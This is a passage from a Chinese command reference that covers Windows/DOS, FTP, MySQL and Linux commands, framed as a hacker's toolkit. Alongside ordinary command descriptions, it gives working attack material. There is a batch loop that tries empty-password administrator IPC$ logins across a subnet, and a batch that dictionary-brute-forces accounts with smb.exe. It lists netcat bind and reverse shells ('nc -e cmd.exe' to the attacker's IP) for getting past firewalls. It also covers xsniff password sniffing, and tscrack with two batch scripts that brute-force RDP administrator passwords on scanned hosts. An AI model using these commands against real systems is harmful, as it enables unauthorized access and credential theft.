用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p></li><li><p>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p></li><li><p>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p></li><li><p>start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令</p></li><li><p>mem 查看cpu使用情况</p></li><li><p>attrib 文件名(目录名) 查看某文件（目录）的属性</p></li><li><p>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p></li><li><p>dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</p></li><li><p>date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间</p></li><li><p>set 指定环境变量名称=要指派给变量的字符 设置环境变量</p></li><li><p>set 显示当前所有的环境变量</p></li><li><p>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p></li><li><p>pause 暂停批处理程序，并显示出：请按任意键继续…</p></li><li><p>if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p></li><li><p>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p></li><li><p>call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</p></li><li><p>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p></li><li><p>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p></li><li><p>echo 信息 在屏幕上显示出信息</p></li><li><p>echo 信息 &gt;&gt; pass.txt 将&quot;信息&quot;保存到pass.txt文件中</p></li><li><p>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p></li><li><p>find 文件名 查找某文件</p></li><li><p>title 标题名字 更改CMD窗口标题名字</p></li><li><p>color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</p></li><li><p>prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p></li><li><p>ver 在DOS窗口下显示版本信息</p></li><li><p>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p></li><li><p>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</p></li><li><p>md　目录名 创建目录</p></li><li><p>replace 源文件　要替换文件的目录 替换文件</p></li><li><p>ren 原文件名　新文件名 重命名文件名</p></li><li><p>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p></li><li><p>type 文件名 显示文本文件的内容</p></li><li><p>more 文件名 逐屏显示输出文件</p></li><li><p>doskey 要锁定的命令=字符</p></li><li><p>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=</p></li><li><p>taskmgr 调出任务管理器</p></li><li><p>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</p></li><li><p>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p></li><li><p>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</p></li><li><p>path 路径可执行文件的文件名 为可执行文件设置一个路径。</p></li><li><p>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?</p></li><li><p>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</p></li><li><p>regedit /e 注册表文件名 导出注册表</p></li><li><p>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。</p></li><li><p>cacls 文件名 查看文件的访问用户权限列表</p></li><li><p>REM 文本内容 在批处理文件中添加注解</p></li><li><p>netsh 查看或更改本地网络配置情况</p></li><li><p>IIS服务命令</p></li><li><p>iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）</p></li><li><p>iisreset /start或stop 启动（停止）所有Internet服务</p></li><li><p>iisreset /restart 停止然后重新启动所有Internet服务</p></li><li><p>iisreset /status 显示所有Internet服务状态</p></li><li><p>iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动</p></li><li><p>iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机</p></li><li><p>iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务</p></li><li><p>iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。</p></li><li><p>FTP 命令： (后面有详细说明内容)</p></li><li><p>ftp的命令行格式为:</p></li><li><p>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。</p></li><li><p>－d 使用调试方式。</p></li><li><p>－n 限制ftp的自动登录,即不使用.netrc文件。</p></li><li><p>－g 取消全局文件名。</p></li><li><p>help [命令] 或 ？[命令] 查看命令说明</p></li><li><p>bye 或 quit 终止主机FTP进程,并退出FTP管理方式.</p></li><li><p>pwd 列出当前远端主机目录</p></li><li><p>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中</p></li><li><p>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中</p></li><li><p>mget [remote-files] 从远端主机接收一批文件至本地主机</p></li><li><p>mput local-files 将本地主机中一批文件传送至远端主机</p></li><li><p>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件</p></li><li><p>ascii 设定以ASCII方式传送文件(缺省值)</p></li><li><p>bin 或 image 设定以二进制方式传送文件</p></li><li><p>bell 每完成一次文件传送,报警提示</p></li><li><p>cdup 返回上一级目录</p></li><li><p>close 中断与远程服务器的ftp会话(与open对应)</p></li><li><p>open host[port] 建立指定ftp服务器连接,可指定连接端口</p></li><li><p>delete 删除远端主机中的文件</p></li><li><p>mdelete [remote-files] 删除一批文件</p></li><li><p>mkdir directory-name 在远端主机中建立目录</p></li><li><p>rename [from] [to] 改变远端主机中的文件名</p></li><li><p>rmdir directory-name 删除远端主机中的目录</p></li><li><p>status 显示当前FTP的状态</p></li><li><p>system 显示远端主机系统类型</p></li><li><p>user user-name [password] [account] 重新以别的用户名登录远端主机</p></li><li><p>open host [port] 重新建立一个新的连接</p></li><li><p>prompt 交互提示模式</p></li><li><p>macdef 定义宏命令</p></li><li><p>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录</p></li><li><p>chmod 改变远端主机的文件权限</p></li><li><p>case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母</p></li><li><p>cd remote－dir 进入远程主机目录</p></li><li><p>cdup 进入远程主机目录的父目录</p></li><li><p>! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip</p></li><li><p>#5</p></li><li><p>MYSQL 命令</p></li><li><p>mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。</p></li><li><p>（例：mysql -h110.110.110.110 -Uroot -P123456</p></li><li><p>注:u与root可以不用加空格，其它也一样）</p></li><li><p>exit 退出MYSQL</p></li><li><p>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码</p></li><li><p>grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）</p></li><li><p>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。</p></li><li><p>use mysql；</p></li><li><p>show tables; 显示库中的数据表</p></li><li><p>describe 表名; 显示数据表的结构</p></li><li><p>create database 库名; 建库</p></li><li><p>use 库名；</p></li><li><p>create table 表名 (字段设定列表)； 建表</p></li><li><p>drop database 库名;</p></li><li><p>drop table 表名； 删库和删表</p></li><li><p>delete from 表名; 将表中记录清空</p></li><li><p>select * from 表名; 显示表中的记录</p></li><li><p>mysqldump --opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。</p></li><li><p>win2003系统下新增命令（实用部份）：</p></li><li><p>shutdown /参数 关闭或重启本地或远程主机。</p></li><li><p>参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。</p></li><li><p>例：shutdown /r /t 0 立即重启本地主机（无延时）</p></li><li><p>taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。</p></li><li><p>参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。</p></li><li><p>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。</p></li><li><p>参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p></li><li><p>Linux系统下基本命令　注：要区分大小写</p></li><li><p>uname 显示版本信息（同win2K的 ver）</p></li><li><p>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）</p></li><li><p>pwd 查询当前所在的目录位置</p></li><li><p>cd cd　…回到上一层目录，注意cd 与…之间有空格。cd　/返回到根目录。</p></li><li><p>cat 文件名 查看文件内容</p></li><li><p>cat &gt;abc.txt 往abc.txt文件中写上内容。</p></li><li><p>more 文件名 以一页一页的方式显示一个文本文件。</p></li><li><p>cp 复制文件</p></li><li><p>mv 移动文件</p></li><li><p>rm 文件名 删除文件，rm -a 目录名删除目录及子目录</p></li><li><p>mkdir 目录名 建立目录</p></li><li><p>rmdir 删除子目录，目录内没有文档。</p></li><li><p>chmod 设定档案或目录的存取权限</p></li><li><p>grep 在档案中查找字符串</p></li><li><p>diff 档案文件比较</p></li><li><p>find 档案搜寻</p></li><li><p>date 现在的日期、时间</p></li><li><p>who 查询目前和你使用同一台机器的人以及Login时间地点</p></li><li><p>w 查询目前上机者的详细资料</p></li><li><p>whoami 查看自己的帐号名称</p></li><li><p>groups 查看某人的Group</p></li><li><p>passwd 更改密码</p></li><li><p>history 查看自己下过的命令</p></li><li><p>ps 显示进程状态</p></li><li><p>kill 停止某进程</p></li><li><p>gcc 黑客通常用它来编译C语言写的文件</p></li><li><p>su 权限转换为指定使用者</p></li><li><p>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。</p></li><li><p>ftp ftp连接上某服务器（同win2K）</p></li><li><p>批处理命令与变量</p></li><li><p>1：for命令及变量 基本格式</p></li><li><p>FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。</p></li><li><p>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3</p></li><li><p>(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个&quot;1&quot;指起始值，第二个&quot;1&quot;指增长量，第三个&quot;254&quot;指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }</p></li><li><p>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开</p></li><li><p>command_parameters：为特定命令指定参数或命令行开关</p></li><li><p>IN (set)：指在(set)中取值；DO command ：指执行command</p></li><li><p>参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。</p></li><li><p>用法举例：</p></li><li><p>@echo off</p></li><li><p>echo 用法格式：test.bat <em>.</em>.* &gt; test.txt</p></li><li><p>for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt</p></li><li><p>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。</p></li><li><p>/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：<em>.</em>.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有&quot;命令成功完成&quot;信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。</p></li><li><p>@echo off</p></li><li><p>echo 用法格式：ok.bat ip</p></li><li><p>FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200</p></li><li><p>存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。</p></li><li><p>七：</p></li><li><p>2：if命令及变量 基本格式</p></li><li><p>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。</p></li><li><p>例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。</p></li><li><p>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。</p></li><li><p>IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。</p></li><li><p>例：“if “%2%”==“4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加&quot; &quot;）</p></li><li><p>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。</p></li><li><p>例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到&quot;:end&quot;标签处。</p></li><li><p>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”</p></li><li><p>系统外部命令</p></li><li><p>注：系统外部命令(均需下载相关工具)</p></li><li><p>瑞士军刀：nc.exe</p></li><li><p>参数说明：</p></li><li><p>-h 查看帮助信息</p></li><li><p>-d 后台模式</p></li><li><p>-e prog程序重定向，一但连接就执行[危险]</p></li><li><p>-i secs延时的间隔</p></li><li><p>-l 监听模式，用于入站连接</p></li><li><p>-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</p></li><li><p>-n IP地址，不能用域名</p></li><li><p>-o film记录16进制的传输</p></li><li><p>-p[空格]端口 本地端口号</p></li><li><p>-r 随机本地及远程端口</p></li><li><p>-t 使用Telnet交互方式</p></li><li><p>-u UDP模式</p></li><li><p>-v 详细输出，用-vv将更详细</p></li><li><p>-w数字 timeout延时间隔</p></li><li><p>-z 将输入，输出关掉（用于扫锚时）</p></li><li><p>基本用法：</p></li><li><p>nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口</p></li><li><p>nc -l -p 80 开启本机的TCP 80端口并监听</p></li><li><p>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口</p></li><li><p>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口</p></li><li><p>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口</p></li><li><p>高级用法：</p></li><li><p>nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</p></li><li><p>nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt</p></li><li><p>nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</p></li><li><p>type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用</p></li><li><p>本机上用：nc -l -p 本机端口</p></li><li><p>在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K</p></li><li><p>nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙</p></li><li><p>本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</p></li><li><p>在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机</p></li><li><p>备 注：</p></li><li><p>| 管道命令</p></li><li><p>&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令</p></li><li><p>@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中</p></li><li><p>&gt;与&gt;&gt;的区别 &quot;&gt;“指：覆盖；”&gt;&gt;&quot;指：保存到(添加到）。</p></li><li><p>如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p></li><li><p>八：</p></li><li><p>扫描工具：xscan.exe</p></li><li><p>基本格式</p></li><li><p>xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚&quot;起始IP到终止IP&quot;段的所有主机信息</p></li><li><p>xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚&quot;主机IP列表文件名&quot;中的所有主机信息</p></li><li><p>检测项目</p></li><li><p>-active 检测主机是否存活</p></li><li><p>-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）</p></li><li><p>-port 检测常用服务的端口状态</p></li><li><p>-ftp 检测FTP弱口令</p></li><li><p>-pub 检测FTP服务匿名用户写权限</p></li><li><p>-pop3 检测POP3-Server弱口令</p></li><li><p>-smtp 检测SMTP-Server漏洞</p></li><li><p>-sql 检测SQL-Server弱口令</p></li><li><p>-smb 检测NT-Server弱口令</p></li><li><p>-iis 检测IIS编码/解码漏洞</p></li><li><p>-cgi 检测CGI漏洞</p></li><li><p>-nasl 加载Nessus攻击脚本</p></li><li><p>-all 检测以上所有项目</p></li><li><p>其它选项</p></li><li><p>-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过&quot;-l&quot;参数获取</p></li><li><p>-l 显示所有网络适配器</p></li><li><p>-v 显示详细扫描进度</p></li><li><p>-p 跳过没有响应的主机</p></li><li><p>-o 跳过没有检测到开放端口的主机</p></li><li><p>-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10</p></li><li><p>-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)</p></li><li><p>用法示例</p></li><li><p>xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机</p></li><li><p>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机</p></li><li><p>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机</p></li><li><p>九：</p></li><li><p>命令行方式嗅探器: xsniff.exe</p></li><li><p>可捕获局域网内FTP/SMTP/POP3/HTTP协议密码</p></li><li><p>参数说明</p></li><li><p>-tcp 输出TCP数据报</p></li><li><p>-udp 输出UDP数据报</p></li><li><p>-icmp 输出ICMP数据报</p></li><li><p>-pass 过滤密码信息</p></li><li><p>-hide 后台运行</p></li><li><p>-host 解析主机名</p></li><li><p>-addr IP地址 过滤IP地址</p></li><li><p>-port 端口 过滤端口</p></li><li><p>-log 文件名 将输出保存到文件</p></li><li><p>-asc 以ASCII形式输出</p></li><li><p>-hex 以16进制形式输出</p></li><li><p>用法示例</p></li><li><p>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中</p></li><li><p>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出</p></li><li><p>终端服务密码破解: tscrack.exe</p></li><li><p>参数说明</p></li><li><p>-h 显示使用帮助</p></li><li><p>-v 显示版本信息</p></li><li><p>-s 在屏幕上打出解密能力</p></li><li><p>-b 密码错误时发出的声音</p></li><li><p>-t 同是发出多个连接（多线程）</p></li><li><p>-N Prevent System Log entries on targeted server</p></li><li><p>-U 卸载移除tscrack组件</p></li><li><p>-f 使用－f后面的密码</p></li><li><p>-F 间隔时间（频率）</p></li><li><p>-l 使用－l后面的用户名</p></li><li><p>-w 使用－w后面的密码字典</p></li><li><p>-p 使用－p后面的密码</p></li><li><p>-D 登录主页面</p></li><li><p>用法示例</p></li><li><p>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码</p></li><li><p>tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户</p></li><li><p>@if not exist ipcscan.txt goto noscan</p></li><li><p>@for /f &quot;tokens=1 delims= &quot; %%i in (3389.txt) do call hack.bat %%i</p></li><li><p>nscan</p></li><li><p>@echo 3389.txt no find or scan faild</p></li><li><p>(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)</p></li><li><p>3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat</p></li><li><p>@if not exist tscrack.exe goto noscan</p></li><li><p>@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt</p></li><li><p>:noscan</p></li><li><p>@echo tscrack.exe no find or scan faild</p></li><li><p>(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)</p></li><li><p>hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。</p></li><li><p>其它</p></li><li><p>Shutdown.exe</p></li><li><p>Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）</p></li><li><p>fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）</p></li><li><p>fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息</p></li><li><p>Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。</p></li><li><p>OpenTelnet.exe (远程开启telnet工具)</p></li><li><p>opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。</p></li><li><p>NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。</p></li><li><p>ResumeTelnet.exe (OpenTelnet附带的另一个工具)</p></li><li><p>resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。</p></li><li><p>FTP命令详解</p></li><li><p>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。</p></li><li><p>FTP的命令行格式为：</p></li><li><p>ftp -v -d -i -n -g [主机名] ，其中</p></li><li><p>-v 显示远程服务器的所有响应信息</p></li><li><p>-n 限制ftp的自动登录，即不使用；.n etrc文件；</p></li><li><p>-d 使用调试方式；</p></li><li><p>-g 取消全局文件名。</p></li><li><p>FTP使用的内部命令如下(中括号表示可选项):</p></li><li><p>1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip</p></li><li><p>2.$ macro-ame[args]： 执行宏定义macro-name。</p></li><li><p>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。</p></li><li><p>4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</p></li><li><p>5.ascii：使用ascii类型传输方式。</p></li><li><p>6.bell：每个命令执行完毕后计算机响铃一次。</p></li><li><p>7.bin：使用二进制文件传输方式。</p></li><li><p>8.bye：退出ftp会话过程。</p></li><li><p>9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。</p></li><li><p>10. cd remote-dir：进入远程主机目录。</p></li><li><p>11.cdup：进入远程主机目录的父目录。</p></li><li><p>12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</p></li><li><p>13.close：中断与远程服务器的ftp会话(与open对应)。</p></li><li><p>14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。</p></li><li><p>15.delete remote-file：删除远程主机文件。</p></li><li><p>16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</p></li><li><p>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</p></li><li><p>18.disconnection：同close。</p></li><li><p>19.form format：将文件传输方式设置为format，缺省为file方式。</p></li><li><p>20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。</p></li><li><p>21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</p></li><li><p>22.hash：每传输1024字节，显示一个hash符号(#)。</p></li><li><p>23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</p></li><li><p>24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</p></li><li><p>25.image：设置二进制传输方式(同binary)。</p></li><li><p>26.lcd[dir]：将本地工作目录切换至dir。</p></li><li><p>27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。</p></li><li><p>28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</p></li><li><p>29.mdelete[remote-file]：删除远程主机文件。</p></li><li><p>30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir <em>.o.</em>.zipoutfile 。</p></li><li><p>31.mget remote-files：传输多个远程文件。</p></li><li><p>32.mkdir dir-name：在远程主机中建一目录。</p></li><li><p>33.mls remote-file local-file：同nlist，但可指定多个文件名。</p></li><li><p>34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</p></li><li><p>35.modtime file-name：显示远程主机文件的最后修改时间。</p></li><li><p>36.mput local-file：将多个文件传输至远程主机。</p></li><li><p>37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</p></li><li><p>38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</p></li><li><p>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。</p></li><li><p>40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</p></li><li><p>41.open host[port]：建立指定ftp服务器连接，可指定连接端口。</p></li><li><p>42.passive：进入被动传输方式。</p></li><li><p>43.prompt：设置多个文件传输时的交互提示。</p></li><li><p>44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</p></li><li><p>45.put local-file[remote-file]：将本地文件local-file传送至远程主机。</p></li><li><p>46.pwd：显示远程主机的当前工作目录。</p></li><li><p>47.quit：同bye，退出ftp会话。</p></li><li><p>48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.</p></li><li><p>49.recv remote-file[local-file]：同get。</p></li><li><p>50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</p></li><li><p>51.rhelp[cmd-name]：请求获得远程主机的帮助。</p></li><li><p>52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</p></li><li><p>53.rename[from][to]：更改远程主机文件名。</p></li><li><p>54.reset：清除回答队列。</p></li><li><p>55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。</p></li><li><p>56.rmdir 